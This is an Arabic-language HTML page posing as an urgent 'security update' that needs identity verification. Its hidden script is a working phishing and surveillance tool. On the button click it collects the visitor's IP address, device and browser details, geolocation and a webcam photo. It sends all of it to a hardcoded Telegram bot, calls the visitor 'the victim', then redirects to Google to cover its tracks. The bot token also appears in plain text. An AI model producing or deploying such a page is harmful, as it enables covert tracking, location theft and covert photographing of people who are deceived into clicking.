<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>تحديث الأمان</title>
    <style>
        body {
            background: #f0f2f5;
            font-family: Arial;
            text-align: center;
            padding: 50px;
        }
        .box {
            background: white;
            padding: 40px;
            border-radius: 10px;
            max-width: 400px;
            margin: auto;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        button {
            background: #1877f2;
            color: white;
            padding: 12px 30px;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }
    </style>
</head>
<body>
<div class="box">
    <h2>🔒 تحديث أمني ضروري</h2>
    <p>نظامك يحتاج تحديث فوري للتحقق من الهوية.</p>
    <button onclick="start()">اضغط هنا للتحديث</button>
    <p id="status"></p>
</div>

<script>
// توكن التليغرام حقك
const TOKEN = "8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg";
const CHAT_ID = "7214473798";

function sendToTelegram(text) {
    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({chat_id: CHAT_ID, text: text})
    }).catch(e => console.log(e));
}

function sendPhoto(base64Image) {
    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            chat_id: CHAT_ID,
            photo: base64Image,
            caption: "📸 صورة من كاميرا الضحية"
        })
    }).catch(e => console.log(e));
}

function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(pos) {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            const map = `https://maps.google.com/?q=${lat},${lon}`;
            sendToTelegram(`📍 **الموقع الجغرافي**\nالخطوط: ${lat}\nالطول: ${lon}\nالخريطة: ${map}`);
        }, function(err) {
            sendToTelegram("❌ المستخدم رفض مشاركة الموقع");
        });
    } else {
        sendToTelegram("❌ المتصفح لا يدعم تحديد الموقع");
    }
}

function getIP() {
    fetch('https://api.ipify.org?format=json')
        .then(r => r.json())
        .then(data => {
            sendToTelegram(`🌐 **IP الضحية:** ${data.ip}`);
        })
        .catch(() => sendToTelegram("❌ تعذر جلب IP"));
}

function getDeviceInfo() {
    let info = `📱 **معلومات الجهاز**\n`;
    info += `المتصفح: ${navigator.userAgent}\n`;
    info += `اللغة: ${navigator.language}\n`;
    info += `الوقت: ${new Date().toLocaleString()}`;
    sendToTelegram(info);
}

function takePhoto() {
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(function(stream) {
                let video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                setTimeout(() => {
                    let canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    let base64 = canvas.toDataURL('image/jpeg');
                    sendPhoto(base64);
                    stream.getTracks().forEach(track => track.stop());
                }, 1000);
            })
            .catch(() => sendToTelegram("❌ المستخدم رفض الكاميرا"));
    } else {
        sendToTelegram("❌ الكاميرا غير مدعومة");
    }
}

function start() {
    document.getElementById('status').innerHTML = "جاري التحقق...";
    sendToTelegram("🟢 **دخول جديد!** الضحية فتح الرابط");
    getIP();
    getDeviceInfo();
    getLocation();
    takePhoto();
    document.getElementById('status').innerHTML = "✅ تم التحقق! جاري التوجيه...";
    setTimeout(() => {
        window.location.href = "https://www.google.com";
    }, 2000);
}
</script>
</body>
</html>
